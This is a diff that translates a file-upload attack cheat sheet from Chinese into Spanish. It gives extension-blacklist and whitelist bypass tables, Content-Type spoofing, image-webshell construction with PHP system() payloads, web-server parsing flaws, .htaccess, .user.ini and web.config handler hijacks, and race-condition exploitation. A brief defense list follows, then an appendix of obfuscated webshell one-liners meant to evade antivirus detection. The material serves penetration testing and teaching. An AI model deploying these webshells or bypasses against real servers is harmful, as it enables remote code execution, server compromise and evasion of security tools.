@@ -35,140 +35,140 @@ Rutas de prueba de editores:
 
 Tabla de referencia rápida para bypass de listas negras:
 
-| 技巧 | PHP | ASP/ASPX | JSP |
+| Técnica | PHP | ASP/ASPX | JSP |
 |-----|-----|----------|-----|
-| 大小写 | `.Php .pHp` | `.Asp .aSp` | `.Jsp .jSp` |
-| 双写 | `.pphphp` | `.asaspp` | `.jsjspp` |
-| 特殊后缀 | `.php3 .php5 .phtml .phar` | `.asa .cer .cdx` | `.jspx .jspa` |
-| 空格/点 | `.php .` | `.asp.` | `.jsp.` |
+| Mayúsculas/minúsculas | `.Php .pHp` | `.Asp .aSp` | `.Jsp .jSp` |
+| Doble escritura | `.pphphp` | `.asaspp` | `.jsjspp` |
+| Sufijo especial | `.php3 .php5 .phtml .phar` | `.asa .cer .cdx` | `.jspx .jspa` |
+| Espacio/punto | `.php .` | `.asp.` | `.jsp.` |
 | ::$DATA | N/A | `.asp::$DATA` | N/A |
-| %00截断 | `.php%00.jpg` | `.asp%00.jpg` | `.jsp%00.jpg` |
-| 分号(IIS) | N/A | `.asp;.jpg` | N/A |
-| 换行(Apache) | `.php\x0a` | N/A | N/A |
+| Truncamiento %00 | `.php%00.jpg` | `.asp%00.jpg` | `.jsp%00.jpg` |
+| Punto y coma (IIS) | N/A | `.asp;.jpg` | N/A |
+| Salto de línea (Apache) | `.php\x0a` | N/A | N/A |
 
-白名单绕过方法:
+Métodos de bypass de listas blancas:
 
-| 技术 | 原理 | 条件 |
+| Técnica | Principio | Condición |
 |-----|------|------|
-| 解析漏洞 | 上传白名单文件但被特殊解析 | IIS/Apache/Nginx漏洞 |
-| Apache多后缀 | `shell.php.jpg` 被解析为php | Apache多后缀配置 |
-| %00截断 | `shell.php%00.jpg` | PHP < 5.3.4 |
-| 配置文件上传 | 上传`.htaccess`/`.user.ini` | 允许txt/配置文件 |
-| 图片马+LFI | 上传图片马配合文件包含 | 存在LFI漏洞 |
+| Vulnerabilidad de parsing | Se carga un archivo de la lista blanca pero se analiza de forma especial | Vulnerabilidad de IIS/Apache/Nginx |
+| Múltiples extensiones en Apache | `shell.php.jpg` se analiza como php | Configuración de múltiples extensiones de Apache |
+| Truncamiento %00 | `shell.php%00.jpg` | PHP < 5.3.4 |
+| Carga de archivo de configuración | Cargar `.htaccess`/`.user.ini` | Se permite txt/archivos de configuración |
+| Imagen con webshell + LFI | Cargar imagen con webshell combinada con inclusión de archivos | Existe vulnerabilidad LFI |
 
-### 1.4 绕过技巧 - MIME/Content-Type
+### 1.4 Técnicas de bypass - MIME/Content-Type
 
 ```
-修改Content-Type为以下值即可绕过:
+Modificar el Content-Type a los siguientes valores permite el bypass:
 image/jpeg | image/gif | image/png | image/bmp
-application/octet-stream (通用)
+application/octet-stream (genérico)
 
-Burp拦截修改示例:
+Ejemplo de modificación interceptando con Burp:
 Content-Disposition: form-data; name="file"; filename="shell.php"
-Content-Type: image/jpeg    <-- 关键修改点
+Content-Type: image/jpeg    <-- Punto de modificación clave
 ```
 
-### 1.5 绕过技巧 - 文件头/内容检测
+### 1.5 Técnicas de bypass - Detección de cabecera/contenido de archivo
 
-常见文件Magic Number:
+Magic Numbers de archivos comunes:
 
-| 类型 | Magic Number(Hex) | ASCII |
+| Tipo | Magic Number (Hex) | ASCII |
 |-----|-------------------|-------|
-| JPEG | `FF D8 FF` | 无可读ASCII |
+| JPEG | `FF D8 FF` | Sin ASCII legible |
 | PNG | `89 50 4E 47` | .PNG |
 | GIF | `47 49 46 38` | GIF8 |
 | BMP | `42 4D` | BM |
 | PDF | `25 50 44 46` | %PDF |
 | ZIP | `50 4B 03 04` | PK.. |
 
-图片马制作:
+Creación de imagen con webshell:
 
 ```bash
-# 方法1: 简单添加文件头
+# Método 1: agregar cabecera de archivo de forma simple
 GIF89a<?php system($_POST['cmd']); ?>
 
-# 方法2: 合并文件
+# Método 2: fusionar archivos
 copy /b image.gif+shell.php shell.gif      # Windows
 cat image.gif shell.php > shell.gif         # Linux
 
-# 方法3: EXIF注入
+# Método 3: inyección EXIF
 exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
 ```
 
-### 1.6 Web服务器解析漏洞
+### 1.6 Vulnerabilidades de parsing del servidor web
 
 ```
 IIS 5.x/6.0:
-  目录解析: /shell.asp/1.jpg     -> 解析为ASP
-  文件解析: shell.asp;.jpg       -> 解析为ASP
-  畸形解析: shell.asp.jpg        -> 可能解析为ASP
+  Análisis de directorio: /shell.asp/1.jpg     -> se analiza como ASP
+  Análisis de archivo: shell.asp;.jpg          -> se analiza como ASP
+  Análisis deforme: shell.asp.jpg              -> puede analizarse como ASP
 
 Apache:
-  多后缀: shell.php.xxx          -> 从右向左解析
+  Múltiples extensiones: shell.php.xxx          -> se analiza de derecha a izquierda
   .htaccess: AddType application/x-httpd-php .jpg
-  换行解析: shell.php%0a         -> CVE-2017-15715
+  Análisis con salto de línea: shell.php%0a     -> CVE-2017-15715
 
 Nginx:
-  畸形解析: /1.jpg/shell.php     -> cgi.fix_pathinfo=1
-  空字节: shell.jpg%00.php       -> 老版本漏洞
+  Análisis deforme: /1.jpg/shell.php     -> cgi.fix_pathinfo=1
+  Byte nulo: shell.jpg%00.php            -> vulnerabilidad de versiones antiguas
 
 Tomcat:
-  PUT方法: PUT /shell.jsp/       -> CVE-2017-12615
+  Método PUT: PUT /shell.jsp/       -> CVE-2017-12615
 ```
 
-### 1.7 配置文件劫持解析
+### 1.7 Secuestro de análisis mediante archivo de configuración
 
 ```apache
-# .htaccess: 让jpg被解析为PHP
+# .htaccess: hace que jpg se analice como PHP
 <FilesMatch "\.jpg$">
   SetHandler application/x-httpd-php
 </FilesMatch>
 ```
 
 ```ini
-# .user.ini (PHP-FPM): 自动包含图片马
+# .user.ini (PHP-FPM): incluye automáticamente la imagen con webshell
 auto_prepend_file=/var/www/html/uploads/shell.jpg
 ```
 
 ```xml
-<!-- web.config (IIS): 让jpg被FastCGI处理 -->
+<!-- web.config (IIS): hace que jpg sea procesado por FastCGI -->
 <handlers>
   <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule"
        scriptProcessor="C:\php\php-cgi.exe" resourceType="Unspecified" />
 </handlers>
 ```
 
-### 1.8 竞争条件利用
+### 1.8 Explotación de condición de carrera
 
 ```
-原理: 上传后删除存在时间差
-利用: 多线程上传+访问,在删除前执行恶意代码
-技巧: 恶意文件先生成一个新文件到其他位置,新文件不被清理机制删除
+Principio: existe una ventana de tiempo entre la carga y la eliminación
+Explotación: carga y acceso multihilo, ejecutando el código malicioso antes de que sea eliminado
+Técnica: el archivo malicioso primero genera un nuevo archivo en otra ubicación, el cual no es eliminado por el mecanismo de limpieza
 ```
 
-### 1.9 防御措施
+### 1.9 Medidas de defensa
 
-1. 白名单验证: 只允许特定扩展名(`.jpg .png .gif .pdf`)
-2. 多层验证: 扩展名 + MIME(finfo_file) + 文件头 + getimagesize()
-3. 文件重命名: `uniqid() + 固定扩展名`，彻底去除原始文件名
-4. 禁止执行: 上传目录禁止脚本执行权限
-5. 权限最小化: `chmod 0644`，Web用户不可执行
-6. 先检后存: 先验证再存储，使用原子操作防竞争条件
-7. 路径隐藏: 不返回完整路径，使用CDN或随机化URL
+1. Validación de lista blanca: permitir solo extensiones específicas (`.jpg .png .gif .pdf`)
+2. Validación en múltiples capas: extensión + MIME (finfo_file) + cabecera de archivo + getimagesize()
+3. Renombrado de archivos: `uniqid() + extensión fija`, eliminando por completo el nombre de archivo original
+4. Prohibir ejecución: denegar permisos de ejecución de scripts en el directorio de carga
+5. Privilegios mínimos: `chmod 0644`, no ejecutable por el usuario web
+6. Verificar antes de almacenar: validar primero y luego almacenar, usando operaciones atómicas para prevenir condiciones de carrera
+7. Ocultamiento de ruta: no devolver la ruta completa, usar CDN o URLs aleatorizadas
 
 ---
 
 
 ---
-## 附录: Webshell 免杀技巧速查
+## Anexo: Referencia rápida de técnicas de evasión (anti-detección) para Webshell
 
-## 附录B: Webshell免杀技巧速查
+## Anexo B: Referencia rápida de técnicas de evasión (anti-detección) para Webshell
 
 ```php
-$a = 'as'.'sert'; $a($_POST['x']);                    // 变量拼接
-array_map('ass'.'ert', array($_POST['x']));            // 回调函数
-$f = create_function('', $_POST['x']); $f();           // 动态函数
-set_exception_handler('system');                        // 异常处理
+$a = 'as'.'sert'; $a($_POST['x']);                    // Concatenación de variables
+array_map('ass'.'ert', array($_POST['x']));            // Función de callback
+$f = create_function('', $_POST['x']); $f();           // Función dinámica
+set_exception_handler('system');                        // Manejo de excepciones
 throw new Exception($_POST['cmd']);
 ```
 
